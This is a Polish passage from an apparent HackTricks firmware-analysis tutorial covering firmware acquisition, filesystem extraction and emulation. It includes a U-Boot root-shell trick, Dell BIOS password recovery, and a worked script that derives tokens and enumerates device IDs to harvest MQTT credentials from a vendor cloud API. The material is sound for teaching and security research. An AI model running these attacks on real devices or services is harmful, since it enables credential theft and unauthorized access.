# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

Informacje o pozyskiwaniu danych przez dostępne interfejsy sprzętowe znajdziesz w sekcjach [Zrzucanie firmware z użyciem konsoli UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [Zrzucanie pamięci SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Aby przechwycić dane UART podczas uruchamiania urządzenia, zanim uzyskasz dostęp do konsoli, w powtarzalny sposób, zobacz [Sterowanie zasilaniem przez SCPI i przechwytywanie danych oscyloskopem](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym stykają się użytkownicy. Jest przechowywane w pamięci trwałej, dzięki czemu urządzenie ma dostęp do kluczowych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware i jego potencjalna modyfikacja to kluczowe kroki w identyfikowaniu luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy krok w poznawaniu budowy urządzenia i wykorzystywanych w nim technologii. Proces ten obejmuje gromadzenie danych na temat:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów dotyczących bootloadera
- Układu sprzętowego i kart katalogowych
- Metryk bazy kodu i lokalizacji kodu źródłowego
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z przepisami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk w zabezpieczeniach

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza dostępnych komponentów open source za pomocą ręcznych i zautomatyzowanych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od programistów lub producentów)
- **Budując** je według udostępnionych instrukcji
- **Pobierając** z oficjalnych stron pomocy technicznej
- Korzystając z zapytań **Google dork**, aby znaleźć hostowane pliki firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, na przykład za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** je z urządzenia przez połączenia takie jak **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zahardkodowane punkty końcowe aktualizacji**
- **Zrzucając** dane z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, jeśli zawiodą wszystkie inne metody, za pomocą odpowiednich narzędzi sprzętowych

### Tylko logi UART: wymuś powłokę root przez zmienną środowiskową U-Boot w pamięci flash

Jeśli wejście RX interfejsu UART jest ignorowane (dostępne są tylko logi), nadal możesz wymusić uruchomienie powłoki init, **edytując offline blob zmiennych środowiskowych U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Znajdź partycję env U-Boot, edytuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla bloba.
3. Wgraj ponownie tylko partycję env i uruchom urządzenie ponownie; przez UART powinien pojawić się shell.

Jest to przydatne na urządzeniach embedded, na których shell bootloadera jest wyłączony, ale partycję env można zapisywać przez dostęp do zewnętrznej pamięci flash.

### Ujawnianie chronionego kodu za pomocą zadania kopiowania Firewall

Niektóre MCU pozwalają niechronionemu kodowi aplikacji wywoływać bramę do chronionego obszaru zamiast odczytywać chronioną pamięć Flash bezpośrednio. Po uzyskaniu możliwości wykonywania kodu aplikacji sprawdź każde zadanie bramy jako osobny mechanizm transferu pamięci. W przypadku Cypherock X1 bramka wywołań Firewall STM32L4 przyjmowała zadanie, zewnętrzny wskaźnik `data`, długość i chroniony `address`. Zadanie zapisu nie odrzucało wskaźnika źródłowego `data` wskazującego na kod Firewall. Wywołujący nie mógł odczytać tego kodu bezpośrednio, ale sama brama mogła skopiować go do chronionej pamięci nieulotnej, z której zadanie odczytu udostępniało dane.<sup>[[15]](#references)</sup>

Aby odtworzyć ten rodzaj ujawnienia, znajdź zapisywalną stronę chronionej pamięci z odpowiadającym jej zadaniem odczytu, ustaw źródło zapisu na kolejne adresy chronionego kodu i odczytaj przygotowane bajty. Przed ponowieniem zapisu sprawdź typ nośnika pamięci: w tym przypadku była to pamięć Flash, więc przed ponownym użyciem stronę trzeba było wymazać. Badacze użyli procedury, która kasowała i przywracała prawidłową zawartość Secure Data Storage, a następnie umieszczali kod w pozostałym wolnym miejscu, zamiast nadpisywać dane portfela. Wymaga to możliwości wykonywania kodu na MCU oraz dostępnej bramy wywołań; nie jest to bezpośrednie obejście odczytu z niezaufanego hosta.<sup>[[15]](#references)</sup>

Odzyskany kod może ujawnić [luki w zaufaniu do aktualizacji firmware’u i integralności procesu rozruchu](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analiza firmware’u

Skoro **masz już firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak go analizować. Oto różne narzędzia, których możesz do tego użyć:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>` — niska entropia oznacza, że obraz raczej nie jest zaszyfrowany. Wysoka entropia oznacza, że prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([kod](https://code.google.com/archive/p/binvis/)), aby zbadać plik.

### Surowe zasoby wyświetlacza w zewnętrznej pamięci flash

Zrzut zewnętrznej pamięci SPI nie musi zawierać wykonywalnego firmware’u MCU. W przypadku urządzenia z rdzeniem Cortex-M porównaj początek każdego potencjalnego obszaru kodu z mapą pamięci urządzenia: typowa tablica wektorów zaczyna się od wiarygodnego wskaźnika stosu SRAM i adresu procedury obsługi resetu w pamięci wykonywalnej. Sam brak tablicy wektorów pod offsetem zero nie dowodzi, że cały układ nie zawiera kodu; sprawdź inne offsety i sposób uruchamiania. Jeśli `binwalk` nie wykryje żadnego kontenera, sprawdź surowe bajty i skoreluj adresy odczytu flash z [zdekodowanym przechwyceniem SPI](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) z działaniami, które ładują nowe ekrany.<sup>[[14]](#references)</sup>

W przypadku obszaru z zasobami wyświetlacza przetestuj różne formaty pikseli i wymiary, zamiast zakładać, że są to pliki PNG/JPEG. W opisanym urządzeniu użyto klatek **80×160 RGB565 little-endian**: przy dwóch bajtach na piksel klatka ma **25 600 bajtów** (25 KiB), a nie 24 kilobity. Adres odczytu flash pozwolił zidentyfikować offset zasobu ekranu; badacz przekonwertował przygotowany obraz poleceniem `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zastąpił w zrzucie oryginalny zasób plikiem o tej samej wielkości, zapisał go poleceniem `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potwierdził wyświetlenie nowego obrazu. Dowodzi to, że *zewnętrzne zasoby wyświetlacza* można zapisywać — nie że można wyodrębnić lub przeprogramować wewnętrzny firmware MCU. Zachowaj oryginalny zrzut i przed każdym zapisem zweryfikuj wymiary, kolejność bajtów, offset oraz długość zastępowanych danych.<sup>[[14]](#references)</sup>

### Różnicowa analiza flash i możliwe do odzyskania magazyny sekretów XOR

Jeśli format przechowywania ustawienia firmware’u nie jest udokumentowany, najpierw wykonaj kilka pasujących odczytów flash, zmień **dokładnie jedno** ustawienie, ponownie zrzucić cały układ i porównaj offsety. Powtórzenie eksperymentu z kontrolowanymi wartościami pozwala odróżnić ustawienie od liczników i metadanych zapisu; zmiany pod nowymi offsetami zamiast w miejscu wskazują na magazyn typu append-only lub zorganizowany w postaci logu. Zachowaj usunięte lub oznaczone jako nieaktualne wpisy, ponieważ ich bajty danych mogą być nadal możliwe do odzyskania.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Po zlokalizowaniu regionu wyodrębnij moduły firmware’u za pomocą narzędzi takich jak `binwalk` i przeanalizuj w Ghidrze kod zapisujący i walidujący dane. Potwierdź w kodzie granice pól, dopełnienie, indeksowanie klucza i wyprowadzanie klucza, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców w szyfrogramie.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego dopełnienia zerami

Jak opisano w sekcji [szyfrowania opartego na XOR](../../crypto/symmetric/#xor-based-encryption), znany tekst jawny ujawnia bajty strumienia klucza na tych samych pozycjach. Pole o stałym rozmiarze jest szczególnie podatne, gdy jego dopełnienie zerami obejmuje wszystkie indeksy powtarzanego klucza XOR: zaszyfrowane dopełnienie bezpośrednio ujawnia te bajty klucza, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli pokryty jest każdy indeks klucza, odtwórz klucz na podstawie końcowej części szyfrogramu i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Format hasła BIOS-u DVAR firmy Dell, który zawiera lukę, jest konkretnym przykładem: bajt `0` 32-bajtowego pola jest tekstem jawnym, a bajty `1..31` wykorzystują powtarzany 20-bajtowy klucz.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały przed operacją XOR wartość zero. Gdy `L <= 12`, te pozycje obejmują każdy indeks klucza, więc kompletny klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy bajt w postaci jawnej. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Grupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić cały klucz przez padding i umożliwić odszyfrowanie bieżącego, dłuższego rekordu, którego własny padding nie wystarcza. Rotacja hasła może więc zwiększyć narażenie, gdy stary szyfrogram zostanie oznaczony jako usunięty, zamiast wymazany.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje potencjalne rekordy, odzyskuje hasła i może wyświetlać surowe bajty danych przechowywanych i kluczowych. Zbuduj je ze sklonowanego repozytorium i przeskanuj zweryfikowany obraz pamięci flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku niestandardowych parserów odrzucaj fałszywe trafienia, sprawdzając strukturę rekordów, wymagania dotyczące drukowalnych znaków, dopełnienie zerami, entropię klucza oraz spójność w miejscach, w których klucz się zawija. Jeśli powtarzane zrzuty pokazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uszereguj możliwe korekty według tych kryteriów, ale zamiast przedstawiać wyniki heurystyczne jako dokładne odzyskanie danych, oznacz niejednoznaczne znaki.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy, a nie odwracalny szyfrogram, zaś magazyny o strukturze dziennika powinny bezpiecznie usuwać zastąpione dane tajne.<sup>[[12]](#references)</sup>

### Pobieranie systemu plików

Po użyciu wspomnianych wcześniej narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zwykle wyodrębnia go do **folderu nazwanego typem systemu plików**, który zazwyczaj jest jednym z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtów magicznych systemu plików wśród swoich sygnatur**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, wykonując poniższe kroki.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom następujące **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- W przypadku squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu „`squashfs-root`”.

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- W przypadku systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- W przypadku systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych, wbudowanych systemów plików root

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie uznawaj go od razu za uszkodzony. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie root z wielu fizycznych zakresów za pomocą Device Mapper, dlatego wycięcie jednej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza całego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar jest stabilny i żaden proces zapisujący nie ma już otwartego obrazu. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odzyskaj GPT w trybie tylko do odczytu i podłącz wyłącznie wymagany zakres; **nie** uruchamiaj `vgchange -ay` na niezaufanym woluminie fizycznym na stacji roboczej, ponieważ może dojść do konfliktu grup woluminów i niezamierzonych zapisów.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferuj tymczasową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi mieć dostęp do całego obrazu. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zarejestrować przesunięcia w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić osadzoną linię poleceń, kernel i initramfs, a następnie niezależnie sprawdź każdy wynik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć initrd, obiekt ACPI lub podpis do kernela.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i przeprowadź inżynierię wsteczną `/init` oraz wszelkich bibliotek pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) sprawdź odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji; następnie prześledź kod wybierający aktywny slot A/B i tworzący tablicę. Przydatne punkty początkowe w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel linear mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tablica z dwoma segmentami ma zazwyczaj następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz arytmetykę kodu maszynowego dokładnie, w tym szerokość liczby całkowitej, przesunięcia i konwersje jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB, a dopiero potem przelicza go na sektory 512-bajtowe; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany końcowy obszar o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do granicy strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz do analizy, kopiując zakresy w kolejności z tabeli, porcjami o ograniczonym rozmiarze, zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mappera po stronie hosta. Zachowaj przesunięcia wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość wyjściową jako oddzielne asercje.<sup>[[9]](#references)</sup>

#### Odróżnianie uszkodzenia od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź magic `hsqs` i odczytaj 64-bitowe pole `bytes_used` w little-endian pod przesunięciem 40 w superblocku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych ze sobą strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj mocnych kandydatów strukturalnych: dekompresowalnego bloku metadanych, kilku kolejnych prawidłowych wpisów katalogu, wiarygodnych pól inode, inode głównego zgodnego z liczbą inode albo prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie magic nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama podpisana delta sprawia, że niezależne struktury stają się poprawne — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i poszukaj odrzuconych reszt, problemów ze znakiem, przepełnienia lub zaokrąglania do granicy sektora/strony, zanim spróbujesz odzyskiwać osierocone dane lub patchować metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec rozdziel granice ochrony: woluminy LUKS z kluczami zapieczętowanymi w TPM chronią poufność danych, natomiast podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS za pomocą init przeznaczonego wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware'u

Po uzyskaniu firmware'u należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten obejmuje użycie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware'u.

### Narzędzia do wstępnej analizy

Dodatkowe narzędzia i materiały dotyczące analizy firmware'u znajdziesz w [sekcji firmware w Third-Party Tools and Resources](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Poniżej podano zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz poznać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zaleca się narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu nazwanego na podstawie jego typu (np. squashfs, ubifs). Gdy jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku bajtów magicznych, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do zlokalizowania przesunięcia systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, zależnie od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, dane uwierzytelniające zapisane na stałe, punkty końcowe API, funkcje serwerów aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne przeznaczone do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Osadzone pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

W analizie systemu plików pomagają różne narzędzia, które pozwalają wykryć poufne informacje i luki w zabezpieczeniach:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają zidentyfikować niezabezpieczone pliki, które można wykorzystać.

## Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT za pomocą tokenów wyprowadzanych z URL

Wiele koncentratorów IoT pobiera konfigurację dla konkretnego urządzenia z punktu końcowego cloud o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia przy użyciu sekretu zapisanego na stałe, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i jest przedstawiany jako wielkie litery szesnastkowe

Taka konstrukcja pozwala każdemu, kto pozna deviceId i STATIC_KEY, odtworzyć URL i pobrać konfigurację cloud, która często ujawnia jawne dane uwierzytelniające MQTT oraz prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów rozruchowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj wierszy wypisujących wzorzec URL konfiguracji cloud oraz adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bashu i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Pozyskaj konfigurację chmury i dane uwierzytelniające MQTT

- Złóż URL i pobierz JSON za pomocą curl; użyj jq do wyodrębnienia sekretów:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj nieszyfrowany MQTT i słabe ACL dla topiców (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby subskrybować topiki konserwacyjne i szukać wrażliwych zdarzeń:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wyliczanie przewidywalnych identyfikatorów urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów umieszcza bajty OUI producenta, produktu i typu, a po nich sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Uwagi
- Zawsze uzyskaj wyraźną zgodę przed próbą masowej enumeracji.
- Jeśli to możliwe, odzyskuj sekrety za pomocą emulacji lub analizy statycznej, bez modyfikowania docelowego sprzętu.

Emulacja firmware’u umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Takie podejście może napotkać problemy związane z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub konkretnych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, albo na gotową maszynę wirtualną może ułatwić dalsze testowanie.

### Emulowanie pojedynczych plików binarnych

Podczas analizy pojedynczych programów kluczowe jest ustalenie kolejności bajtów i architektury procesora.

#### Przykład dla architektury MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

A także, aby zainstalować niezbędne narzędzia do emulacji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

W przypadku MIPS (big-endian) używa się `qemu-mips`, a dla plików binarnych little-endian wybiera się `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku plików binarnych ARM proces jest podobny — do emulacji używa się emulatora `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware'u, automatyzując ten proces i wspomagając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root na potrzeby emulacji

